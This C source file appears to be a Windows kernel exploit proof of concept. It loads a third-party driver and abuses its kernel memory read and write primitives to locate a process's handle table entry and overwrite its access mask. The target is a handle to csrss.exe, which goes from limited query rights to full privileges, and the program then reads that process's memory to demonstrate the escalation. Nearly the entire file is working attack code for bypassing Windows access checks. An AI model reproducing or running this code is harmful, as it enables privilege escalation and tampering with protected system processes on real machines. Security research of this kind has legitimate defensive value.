#include <windows.h>
#include <function.hpp>

BOOL GetHandleEntryFromHandle(HANDLE Device, int tPID, DWORD64 HandleID, DWORD64 * HandleEntryAddress) {
	
	// 1. Determine which Windows version we're running on
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return FALSE;
		}	

	// 2. Get target process EPROCESS address
	DWORD64 TargetProcessAddress = NULL;
	if (!GetEprocByPid(Device, tPID, &TargetProcessAddress))
		return FALSE;	
	printf("[+] Target EPROCESS address: %p\n", TargetProcessAddress);

	// 3. Get target process handle table address
	DWORD64 HandleTable = 0;
	if (!TDIReadKernel64(Device, TargetProcessAddress + g_ObjOffsets.EPROC_ObjectTable, &HandleTable))
		return FALSE;
	printf("[+] Target process handle table: %p\n", HandleTable);
	
	// 4. Find HANDLE_TABLE_ENTRY for specified handle ID
	if (!GetHandleTableEntry(Device, HandleTable, HandleID, HandleEntryAddress))
		return FALSE;

	return TRUE;
}


BOOL SetHandlePrivs(HANDLE Device, int tPID, DWORD64 HandleID, DWORD Privs) {

	// 1. Get HANDLE_TABLE_ENTRY address of a specified handle
	DWORD64 HandleEntryAddress = 0;
	if (!GetHandleEntryFromHandle(Device, tPID, HandleID, &HandleEntryAddress))
		return FALSE;
	printf("[+] Target handle table entry @ 0x%p\n", HandleEntryAddress);	

	// 2. Set new privileges on the handle
	printf("[+] Assigning new privileges (0x%x) to target handle...", Privs);
	if (!TDIWriteKernel32(Device, HandleEntryAddress + 0x8, Privs)) {
		printf("failed.\n");
		return FALSE;
	}
	printf("done.\n");	

	return TRUE;
}

int main(int argc, char* argv[]) {

	int ret = -1;

	if (argc != 3) {
		printf("[!] Arguments needed. Run: %s <target PID> <handle in hex>\n\tExample: %s 6456 0x320\n", argv[0], argv[0]);
		return ret;
	}
	int TargetPID = atoi(argv[1]);
	DWORD64 HandleID = (DWORD64) strtol(argv[2], NULL, 16);

	// get object offsets for the running Windows version
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return ret;
		}

	// load the driver
	if (!LoadDriver()) {
		printf("[!] Driver could not be loaded! Exiting...\n");
		return ret;
	}
	
	// get access to the 3rd party driver
	HANDLE Device = TDIOpenDevice();
	if (Device == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a device handle\n");
		goto cleanup;
	}
	printf("[+] Device opened\n");

	DWORD64 Obj = 0;
	if (!GetObjectFromHandle(Device, TargetPID, HandleID, &Obj)) {
		printf("[!] Error occured. Exiting...\n");
		goto cleanup;
	}
	printf("[+] Object @ %llx\n", Obj);
	
/*	
	if (!SetHandlePrivs(Device, TargetPID, HandleID, HANDLE_FULL_PRIVS)) {
		printf("[!] Error occured. Exiting...\n");
		goto cleanup;
	}
*/
	// 1. Lookup for csrss.exe PID
	int pid = 0;
	if (!(pid = FindTarget("csrss.exe"))) {
		printf("[!] csrss.exe not found. Ciao!\n");
		goto cleanup;
	}
	printf("[+] Found csrss.exe PID = %d\n", pid);
	
	// 2. Open handle to csrss.exe for minimal rights - query_limited_information
	HANDLE TargetHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (TargetHandle == NULL) {
		printf("[!] Could not open csrss.exe. Ciao!\n");
		goto cleanup;		
	}
	printf("[+] Handle: 0x%x\n", TargetHandle);
	
	// 3. try to read process memory (ex. first 2 bytes of ntdll.dll)
	BYTE data[2] = { 0 };
	char * ntdll = (char *) LoadLibrary("ntdll.dll");
	if (!ReadProcessMemory(TargetHandle, ntdll, &data, 2, NULL)) 
		printf("[!] First read attempt FAILED!\n\n");
	
	// 4. raise the handle privs
	if (!SetHandlePrivs(Device, GetCurrentProcessId(), (DWORD64) TargetHandle, HANDLE_FULL_PRIVS)) {
		printf("[!] Error occured. Exiting...\n");
		goto cleanup;
	}	
	getchar();
	
	// 5. try to read again
	if (!ReadProcessMemory(TargetHandle, ntdll, &data, 2, NULL)) 
		printf("[!] Second read attempt FAILED!\n");
	else
		printf("[*] Second read attempt SUCCESSFUL! Data: [0x%.1X%.1X] (%c%c)\n", data[0], data[1], data[0], data[1]);
	
	// Cleanup
	CloseHandle(TargetHandle);
	ret = 0;

cleanup:
	CloseHandle(Device);
	UnLoadDriver();
	return ret;
}